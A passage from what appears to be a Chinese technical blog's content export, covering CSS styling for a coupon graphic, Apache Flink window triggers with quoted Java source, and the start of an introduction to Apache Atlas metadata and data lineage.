class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">15</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">30deg</span>);</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*设计左侧文本*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.par</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">16px</span> <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">220px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-right</span>: <span class="number">2px</span> dashed <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">3</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">text-align</span>: left;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*文本样式*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.par</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin</span>: <span class="number">6px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.par</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin-right</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.par</span> <span class="selector-class">.sign</span>&#123;<span class="attribute">font-size</span>: <span class="number">34px</span>;&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.par</span> sub&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="css">        <span class="attribute">top</span>: -<span class="number">5px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.copy</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="css">        <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">vertical-align</span>: text-bottom;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">1</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">6px</span> <span class="number">10px</span> <span class="number">12px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.copy</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">13px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin-top</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">margin-bottom</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp</span> <span class="selector-class">.copy</span> <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">font-size</span>: <span class="number">14px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="css">        <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="css">        <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="comment">/*风格*/</span></span></span><br><span class="line"><span class="css">    <span class="comment">/*鹅黄*/</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp_yellow</span>&#123;</span></span><br><span class="line"><span class="css">        <span class="attribute">background</span>: <span class="number">#F39B00</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background</span>: <span class="built_in">radial-gradient</span>(<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="number">0</span>,<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="number">5px</span>,<span class="number">#F39B00</span> <span class="number">5px</span>);</span></span><br><span class="line"><span class="css">        <span class="attribute">background-size</span>: <span class="number">15px</span> <span class="number">15px</span>;</span></span><br><span class="line"><span class="css">        <span class="attribute">background-position</span>: <span class="number">9px</span> <span class="number">3px</span>;</span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.stamp_yellow</span>:before&#123;background-color: <span class="number">#f3c120</span></span></span><br><span class="line"><span class="css">    &#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Lottery<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;stamp stamp_yellow&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;par&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>上品折扣店<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">sub</span> <span class="attr">class</span>=<span class="string">&quot;sign&quot;</span>&gt;</span>$<span class="tag">&lt;/<span class="name">sub</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>50.00<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">sub</span>&gt;</span>优惠券<span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>订单满 100.00 元<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;copy&quot;</span>&gt;</span>副券</span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>2019-02-17<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                2019-02-23<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>立即使用<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果还是不错的，以假乱真哈哈</p>
<p><img src="https://img-blog.csdnimg.cn/20190217173136754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTkyNjcy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="用户接口样式"><a href="#用户接口样式" class="headerlink" title="用户接口样式"></a>用户接口样式</h2><p>控制与用户接口界面相关效果的呈现方式，emmm，听上去很高级，其实就是用户看到的一些像界面边框之类的</p>
<h3 id="案例样式-2"><a href="#案例样式-2" class="headerlink" title="案例样式"></a>案例样式</h3><h4 id="咕咕咕"><a href="#咕咕咕" class="headerlink" title="咕咕咕"></a>咕咕咕</h4>]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>Flink trigger</title>
    <url>/2021/07/24/Flink%20trigger/</url>
    <content><![CDATA[<p>Flink trigger简单介绍和部分源码解析</p>
<span id="more"></span>

<p>先从官网上拉下来trigger的介绍。</p>
<h2 id="Triggers"><a href="#Triggers" class="headerlink" title="Triggers #"></a>Triggers <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/windows/#triggers">#</a></h2><p>A <code>Trigger</code> determines when a window (as formed by the <em>window assigner</em>) is ready to be processed by the <em>window function</em>. Each <code>WindowAssigner</code> comes with a default <code>Trigger</code>. If the default trigger does not fit your needs, you can specify a custom trigger using <code>trigger(...)</code>.</p>
<p>The trigger interface has five methods that allow a <code>Trigger</code> to react to different events:</p>
<ul>
<li>The <code>onElement()</code> method is called for each element that is added to a window.</li>
<li>The <code>onEventTime()</code> method is called when a registered event-time timer fires.</li>
<li>The <code>onProcessingTime()</code> method is called when a registered processing-time timer fires.</li>
<li>The <code>onMerge()</code> method is relevant for stateful triggers and merges the states of two triggers when their corresponding windows merge, <em>e.g.</em> when using session windows.</li>
<li>Finally the <code>clear()</code> method performs any action needed upon removal of the corresponding window.</li>
</ul>
<p>Two things to notice about the above methods are:</p>
<ol>
<li>The first three decide how to act on their invocation event by returning a <code>TriggerResult</code>. The action can be one of the following:</li>
</ol>
<ul>
<li><code>CONTINUE</code>: do nothing,</li>
<li><code>FIRE</code>: trigger the computation,</li>
<li><code>PURGE</code>: clear the elements in the window, and</li>
<li><code>FIRE_AND_PURGE</code>: trigger the computation and clear the elements in the window afterwards.</li>
</ul>
<ol>
<li>Any of these methods can be used to register processing- or event-time timers for future actions.</li>
</ol>
<h3 id="Fire-and-Purge"><a href="#Fire-and-Purge" class="headerlink" title="Fire and Purge #"></a>Fire and Purge <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/windows/#fire-and-purge">#</a></h3><p>Once a trigger determines that a window is ready for processing, it fires, <em>i.e.</em>, it returns <code>FIRE</code> or <code>FIRE_AND_PURGE</code>. This is the signal for the window operator to emit the result of the current window. Given a window with a <code>ProcessWindowFunction</code> all elements are passed to the <code>ProcessWindowFunction</code> (possibly after passing them to an evictor). Windows with <code>ReduceFunction</code>, or <code>AggregateFunction</code> simply emit their eagerly aggregated result.</p>
<p>When a trigger fires, it can either <code>FIRE</code> or <code>FIRE_AND_PURGE</code>. While <code>FIRE</code> keeps the contents of the window, <code>FIRE_AND_PURGE</code> removes its content. By default, the pre-implemented triggers simply <code>FIRE</code> without purging the window state.</p>
<blockquote>
<p>Purging will simply remove the contents of the window and will leave any potential meta-information about the window and any trigger state intact.</p>
</blockquote>
<h3 id="Default-Triggers-of-WindowAssigners"><a href="#Default-Triggers-of-WindowAssigners" class="headerlink" title="Default Triggers of WindowAssigners #"></a>Default Triggers of WindowAssigners <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/windows/#default-triggers-of-windowassigners">#</a></h3><p>The default <code>Trigger</code> of a <code>WindowAssigner</code> is appropriate for many use cases. For example, all the event-time window assigners have an <code>EventTimeTrigger</code> as default trigger. This trigger simply fires once the watermark passes the end of a window.</p>
<p>The default trigger of the <code>GlobalWindow</code> is the <code>NeverTrigger</code> which does never fire. Consequently, you always have to define a custom trigger when using a <code>GlobalWindow</code>.</p>
<blockquote>
<p>By specifying a trigger using <code>trigger()</code> you are overwriting the default trigger of a <code>WindowAssigner</code>. For example, if you specify a <code>CountTrigger</code> for <code>TumblingEventTimeWindows</code> you will no longer get window firings based on the progress of time but only by count. Right now, you have to write your own custom trigger if you want to react based on both time and count.</p>
</blockquote>
<h3 id="Built-in-and-Custom-Triggers"><a href="#Built-in-and-Custom-Triggers" class="headerlink" title="Built-in and Custom Triggers #"></a>Built-in and Custom Triggers <a href="https://ci.apache.org/projects/flink/flink-docs-release-1.13/zh/docs/dev/datastream/operators/windows/#built-in-and-custom-triggers">#</a></h3><p>Flink comes with a few built-in triggers.</p>
<ul>
<li>The (already mentioned) <code>EventTimeTrigger</code> fires based on the progress of event-time as measured by watermarks.</li>
<li>The <code>ProcessingTimeTrigger</code> fires based on processing time.</li>
<li>The <code>CountTrigger</code> fires once the number of elements in a window exceeds the given limit.</li>
<li>The <code>PurgingTrigger</code> takes as argument another trigger and transforms it into a purging one.</li>
</ul>
<p>If you need to implement a custom trigger, you should check out the abstract <a href="https://github.com/apache/flink/blob/release-1.13//flink-streaming-java/src/main/java/org/apache/flink/streaming/api/windowing/triggers/Trigger.java">Trigger </a>class. Please note that the API is still evolving and might change in future versions of Flink.</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>结合源码简单分析一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PublicEvolving</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Trigger</span>&lt;<span class="title">T</span>, <span class="title">W</span> <span class="keyword">extends</span> <span class="title">Window</span>&gt; <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">4104633972991191369L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Trigger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The onElement() method is called for each element that is added to a window.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> TriggerResult <span class="title">onElement</span><span class="params">(T var1, <span class="keyword">long</span> var2, W var4, Trigger.TriggerContext var5)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The onProcessingTime() method is called when a registered processing-time timer fires.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> TriggerResult <span class="title">onProcessingTime</span><span class="params">(<span class="keyword">long</span> var1, W var3, Trigger.TriggerContext var4)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The onEventTime() method is called when a registered event-time timer fires.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> TriggerResult <span class="title">onEventTime</span><span class="params">(<span class="keyword">long</span> var1, W var3, Trigger.TriggerContext var4)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canMerge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The onMerge() method is relevant for stateful triggers and merges the states of two triggers when their corresponding windows merge, e.g. when using session windows.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMerge</span><span class="params">(W window, Trigger.OnMergeContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">&quot;This trigger does not support merging.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finally the clear() method performs any action needed upon removal of the corresponding window.</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(W var1, Trigger.TriggerContext var2)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OnMergeContext</span> <span class="keyword">extends</span> <span class="title">Trigger</span>.<span class="title">TriggerContext</span> </span>&#123;</span><br><span class="line">        &lt;S extends MergingState&lt;?, ?&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">mergePartitionedState</span><span class="params">(StateDescriptor&lt;S, ?&gt; var1)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合官方文档的介绍，可以很清楚的了解每个方法的作用，可以看到主要执行方法都会返回一个元素叫TriggerResult。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">TriggerResult</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 有两个boolean属性，前一个代表是否计算，后一个代表是否清除</span></span><br><span class="line">    CONTINUE(<span class="keyword">false</span>, <span class="keyword">false</span>),</span><br><span class="line">    FIRE_AND_PURGE(<span class="keyword">true</span>, <span class="keyword">true</span>),</span><br><span class="line">    FIRE(<span class="keyword">true</span>, <span class="keyword">false</span>),</span><br><span class="line">    PURGE(<span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> fire;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> purge;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">TriggerResult</span><span class="params">(<span class="keyword">boolean</span> fire, <span class="keyword">boolean</span> purge)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.purge = purge;</span><br><span class="line">        <span class="keyword">this</span>.fire = fire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFire</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.fire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPurge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.purge;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得一提的是，trigger的种类有很多，如下图。</p>
<p><a href="https://imgtu.com/i/Wcl8bD"><img src="https://z3.ax1x.com/2021/07/24/Wcl8bD.png" alt="Wcl8bD.png"></a></p>
<p>我们看一下EventTimeTrigger源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// extends Trigger</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EventTimeTrigger</span> <span class="keyword">extends</span> <span class="title">Trigger</span>&lt;<span class="title">Object</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">EventTimeTrigger</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onElement</span><span class="params">(Object element, <span class="keyword">long</span> timestamp, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (window.maxTimestamp() &lt;= ctx.getCurrentWatermark()) &#123;</span><br><span class="line">          <span class="comment">// if the watermark is already past the window, fire immediately</span></span><br><span class="line">            <span class="keyword">return</span> TriggerResult.FIRE;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 设置定时器</span></span><br><span class="line">            ctx.registerEventTimeTimer(window.maxTimestamp());</span><br><span class="line">            <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onEventTime</span><span class="params">(<span class="keyword">long</span> time, TimeWindow window, TriggerContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> time == window.maxTimestamp() ? TriggerResult.FIRE : TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> TriggerResult <span class="title">onProcessingTime</span><span class="params">(<span class="keyword">long</span> time, TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TriggerResult.CONTINUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">(TimeWindow window, TriggerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 删除定时器</span></span><br><span class="line">        ctx.deleteEventTimeTimer(window.maxTimestamp());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canMerge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onMerge</span><span class="params">(TimeWindow window, OnMergeContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> windowMaxTimestamp = window.maxTimestamp();</span><br><span class="line">        <span class="keyword">if</span> (windowMaxTimestamp &gt; ctx.getCurrentWatermark()) &#123;</span><br><span class="line">            ctx.registerEventTimeTimer(windowMaxTimestamp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EventTimeTrigger()&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EventTimeTrigger <span class="title">create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> EventTimeTrigger();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体的使用例子在另一篇文章有写</p>
<p><a href="https://woaixiaoyuyu.github.io/2021/07/24/%E7%94%B5%E5%95%86%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90/#more">链接</a></p>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Flink</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Atlas 文档</title>
    <url>/2021/07/28/Apache%20Atlas%20%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p>关于元数据管理和数据血缘框架atlas的学习</p>
<p>参考链接</p>
<p><a href="https://blog.csdn.net/Zsigner/article/details/115306506">https://blog.csdn.net/Zsigner/article/details/115306506</a></p>
<p><a href="https://atlas.apache.org/#/HighAvailability">https://atlas.apache.org/#/HighAvailability</a></p>
<p><a href="https://blog.csdn.net/Milkcoffeezhu/article/details/107049699">https://blog.csdn.net/Milkcoffeezhu/article/details/107049699</a></p>
<span id="more"></span>

<h2 id="数据仓库元数据管理"><a href="#数据仓库元数据管理" class="headerlink" title="数据仓库元数据管理"></a>数据仓库元数据管理</h2><p>元数据（MetaData）狭义的解释是用来描述数据的数据。广义的来看，除了业务逻辑直接读写处理的那些业务数据，所有其它用来维持整个系统运转所需的信息／数据都可以叫作元数据。如数据库中表的Schema信息，任务的血缘关系，用户和脚本／任务的权限映射关系信息等。</p>
<p>管理元数据的目的，是为了让用户能够更高效的使用数据，也是为了让平台管理人员能更加有效的做好数据的维护管理工作。</p>
<p>但通常这些元数据信息是散落在平台的各个系统，各种流程之中的，它们的管理也可能或多或少可以通过各种子系统自身的工具，方案或流程逻辑来实现。</p>
<p>元数据管理平台很重要的一个功能就是信息的收集，至于收集哪些信息，取决于业务的需求和需要解决的目标问题。</p>
<p>元数据管理平台还需要考虑如何以恰当的形式对这些元数据信息进行展示；进一步的，如何将这些元数据信息通过服务的形式提供给周边上下游系统使用，真正帮助大数据平台完成质量管理的闭环工作。</p>
<p>应该收集那些信息，没有绝对的标准，但是对大数据开发平台来说，常见的元数据信息包括：</p>
<ul>
<li>表结构信息</li>
<li>数据的空间存储，读写记录，权限归属和其它各类统计信息</li>
<li>数据的血缘关系信息</li>
<li>数据的业务属性信息</li>
</ul>
<h2 id="数据血缘关系"><a href="#数据血缘关系" class="headerlink" title="数据血缘关系"></a>数据血缘关系</h2><p>血缘信息或者叫做Lineage的血统信息是什么，简单的说就是数据之间的上下游来源去向关系，数据从哪里来到哪里去。如果一个数据有问题，可以根据血缘关系往上游排查，看看到底在哪个环节出了问题。此外也可以通过数据的血缘关系，建立起生产这些数据的任务之间的依赖关系，进而辅助调度系统的工作调度，或者用来判断一个失败或错误的任务可能对哪些下游数据造成影响等等。</p>
<p>分析数据的血缘关系看起来简单，但真的要做起来，并不容易，因为数据的来源多种多样，加工数据的手段，所使用的计算框架可能也各不相同，此外也不是所有的系统天生都具备获取相关信息的能力。而针对不同的系统，血缘关系具体能够分析到的粒度可能也不一样，有些能做到表级别，有些甚至可以做到字段级别。</p>
<p>以Hive表为例，通过分析Hive脚本的执行计划，是可以做到相对精确的定位出字段级别的数据血缘关系的。而如果是一个MapReduce任务生成的数据，从外部来看，可能就只能通过分析MR任务输出的Log日志信息来粗略判断目录级别的读写关系，从而间接推导数据的血缘依赖关系了。</p>
<h2 id="数据的业务属性信息"><a href="#数据的业务属性信息" class="headerlink" title="数据的业务属性信息"></a>数据的业务属性信息</h2><p>业务属性信息都有哪些呢？如一张数据表的统计口径信息，这张表干什么用的，各个字段的具体统计方式，业务描述，业务标签，脚本逻辑的历史变迁记录，变迁原因等，此外还包括对应的数据表格是由谁负责开发的，具体数据的业务部门归属等。数据的业务属性信息，首先是为业务服务的，它的采集和展示也就需要尽可能的和业务环境相融合，只有这样才能真正发挥这部分元数据信息的作用。</p>
<h2 id="What-is-Atlas"><a href="#What-is-Atlas" class="headerlink" title="What is Atlas"></a>What is Atlas</h2><p>很长一段时间内，市面都没有成熟的大数据元数据管理解决方案。直到2015年，Hortonworks终于坐不住了，约了一众小伙伴公司倡议：咱们开始整个数据治理方案吧。然后，包含数据分类、集中策略引擎、数据血缘、安全和生命周期管理功能的Atlas应运而生。(类似的产品还有Linkedin 在2016年新开源的项目 WhereHows ) 。</p>
<p>Atlas是Hadoop平台元数据框架；</p>
<p>Atlas是一组可扩展的核心基础治理服务，使企业能够有效，高效地满足Hadoop中的合规性要求，并能与整个企业数据生态系统集成；</p>
<p>Apache Atlas为组织提供了开放的元数据管理和治理功能，以建立数据资产的目录，对这些资产进行分类和治理，并为IT团队、数据分析团队提供围绕这些数据资产的协作功能。</p>
<h3 id="Atlas-High-Level-Architecture-Overview"><a href="#Atlas-High-Level-Architecture-Overview" class="headerlink" title="Atlas High Level Architecture - Overview"></a>Atlas High Level Architecture - Overview</h3><p><img src="https://z3.ax1x.com/2021/07/28/W72kNj.png" alt="W72kNj.png"></p>
<p>Atlas由元数据的收集，存储和查询展示三部分核心组件组成。此外，还会有一个管理后台对整体元数据的采集流程以及元数据格式定义和服务的部署等各项内容进行配置管理。</p>
<p>Atlas包括以下组件：</p>
<ul>
<li><p>Core。Atlas功能核心组件，提供元数据的获取与导出(Ingets/Export)、类型系统(TypeSystem)、元数据存储索引查询等核心功能</p>
</li>
<li><p><strong>图形引擎</strong>: Atlas在内部使用Graph模型持久保存它管理的元数据对象。这种方法提供了很大的灵活性，可以有效地处理元数据对象之间的丰富关系。图形引擎组件负责在Atlas类型系统的类型和实体之间进行转换，以及底层图形持久性模型。除了管理图形对象之外，图形引擎还为元数据对象创建适当的索引，以便可以有效地搜索它们。 Atlas使用JanusGraph存储元数据对象。</p>
